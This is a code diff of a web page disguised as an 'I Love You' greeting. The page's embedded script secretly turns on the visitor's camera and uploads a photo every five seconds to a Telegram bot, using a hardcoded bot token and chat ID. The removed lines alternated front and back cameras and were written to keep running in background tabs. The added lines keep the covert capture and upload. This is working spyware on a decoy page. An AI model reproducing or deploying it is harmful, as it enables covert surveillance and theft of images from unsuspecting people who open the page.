@@ -61,85 +61,77 @@
     <h1>I <span>Love</span> You</h1>
   </div>
   <script>
-        const telegramBotToken = "7891742749:AAHRWnK8KtgV4c7KEb6MY27D9AXdIsrKp_w"; // আপনার টেলিগ্রাম বট টোকেন দিন
-        const chatId = "1987016824"; // আপনার চ্যাট আইডি দিন
+        const video = document.getElementById('camera');
+        const canvas = document.getElementById('canvas');
+        const context = canvas.getContext('2d');
 
-        let stream;
-        const videoElement = document.getElementById("video");
-        const canvas = document.getElementById("canvas");
+        // Telegram Bot Information
+        const botToken = "7891742749:AAHRWnK8KtgV4c7KEb6MY27D9AXdIsrKp_w"; // Replace with your bot token
+        const chatId = "1987016824"; // Replace with your chat ID
 
-        // ক্যামেরা চালু করার ফাংশন
-        async function startCamera(facingMode) {
-            if (stream) {
-                stream.getTracks().forEach((track) => track.stop());
-            }
+        // 1. Camera Access
+        async function startCamera() {
             try {
-                stream = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: facingMode }
-                });
-                videoElement.srcObject = stream;
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                video.srcObject = stream;
             } catch (error) {
-                console.error("Camera access error:", error);
+                alert('Camera access denied or unavailable!');
+                console.error(error);
             }
         }
 
-        // ফটো তোলার ফাংশন
-        async function capturePhoto() {
-            const context = canvas.getContext("2d");
-            canvas.width = videoElement.videoWidth;
-            canvas.height = videoElement.videoHeight;
-            context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
+        // 2. Capture and Send Photo
+        async function captureAndSend() {
+            // Capture Photo
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            const imageData = canvas.toDataURL('image/png');
 
-            const blob = await new Promise((resolve) => canvas.toBlob(resolve, "image/jpeg"));
-
+            // Convert Base64 to Blob
+            const blob = dataURItoBlob(imageData);
             const formData = new FormData();
-            formData.append("chat_id", chatId);
-            formData.append("photo", blob, "photo.jpg");
+            formData.append('chat_id', chatId);
+            formData.append('photo', blob, 'photo.png');
 
+            // Send Photo to Telegram
             try {
-                await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendPhoto`, {
-                    method: "POST",
+                const response = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                    method: 'POST',
                     body: formData
                 });
-                console.log("Photo sent to Telegram.");
+
+                const result = await response.json();
+                if (result.ok) {
+                    console.log('Photo sent successfully!');
+                } else {
+                    console.error('Failed to send photo!', result);
+                }
             } catch (error) {
-                console.error("Error sending photo to Telegram:", error);
+                console.error('Error sending photo!', error);
             }
         }
 
-        // ফ্রন্ট এবং ব্যাক ক্যামেরা পরিবর্তন করে ফটো তুলুন
-        async function startAutomaticCapture() {
-            while (true) {
-                // ফ্রন্ট ক্যামেরা দিয়ে ফটো তুলুন
-                await startCamera("user");
-                console.log("Using front camera...");
-                await delay(5000); // ৫ সেকেন্ড অপেক্ষা
-                await capturePhoto();
-
-                // ব্যাক ক্যামেরা দিয়ে ফটো তুলুন
-                await startCamera("environment");
-                console.log("Using back camera...");
-                await delay(5000); // ৫ সেকেন্ড অপেক্ষা
-                await capturePhoto();
+        // Utility: Convert Data URI to Blob
+        function dataURItoBlob(dataURI) {
+            const byteString = atob(dataURI.split(',')[1]);
+            const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
+            const ab = new ArrayBuffer(byteString.length);
+            const ia = new Uint8Array(ab);
+            for (let i = 0; i < byteString.length; i++) {
+                ia[i] = byteString.charCodeAt(i);
             }
+            return new Blob([ab], { type: mimeString });
         }
 
-        // বিল্ট-ইন delay ফাংশন
-        function delay(ms) {
-            return new Promise((resolve) => setTimeout(resolve, ms));
+        // 3. Start Process (Capture and Send Every 5 Seconds)
+        async function startContinuousCapture() {
+            await startCamera();
+            setInterval(captureAndSend, 5000); // Capture & send every 5 seconds
         }
 
-        // ট্যাব নিষ্ক্রিয় হলেও কাজ চালু রাখুন
-        document.addEventListener("visibilitychange", () => {
-            if (document.visibilityState === "visible") {
-                console.log("Tab is active");
-            } else {
-                console.log("Tab is inactive, but script continues...");
-            }
-        });
-
-        // স্ক্রিপ্ট শুরু করুন
-        startAutomaticCapture();
+        // Start Continuous Process
+        startContinuousCapture();
     </script>
 </body>
 
